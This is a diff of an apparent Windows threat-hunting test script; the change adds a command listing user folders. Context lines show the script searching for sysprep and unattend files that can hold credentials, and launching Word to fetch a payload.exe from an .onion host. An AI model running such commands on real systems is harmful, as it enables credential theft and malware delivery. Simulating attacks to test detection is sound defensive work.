@@ -511,6 +511,8 @@ dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>n
 ECHO ============================
 winword.exe http://bcdyzitklmnprti.onion/payload.exe
 ECHO ============================
+dir /b /ad "C:\Users\"
+ECHO ============================
 ECHO ***************************************************
 ECHO Test already Finishied  ! Happy hunting threats :)
 ECHO ***************************************************
